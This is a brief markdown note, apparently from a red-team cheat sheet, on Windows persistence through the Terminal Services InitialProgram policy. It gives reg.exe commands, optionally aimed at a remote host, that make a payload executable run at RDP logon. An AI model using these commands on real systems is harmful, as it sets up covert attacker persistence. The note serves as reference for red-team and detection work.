# TS Initial Program

If it's set to `0x1` then it indicates the RDP is enabled.

```
C:\> reg.exe query "[\\<IP>\]HKCU\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fInheritInitialProgram
```

```
C:\> reg.exe add "[\\<IP>\]HKCU\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /t REG_SZ /v InitialProgram /d "C:\path\to\payload.exe"
```


> [!NOTE]
> This is optional.

Set the working directory.

```
C:\> reg.exe add "[\\<IP>\]HKCU\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /t REG_SZ /v WorkingDirectory /d "C:\Windows\System32"
```

---
## References

### Persistence Info

- [Persistence Info: TS Initial Program](https://persistence-info.github.io/Data/tsinitialprogram.html)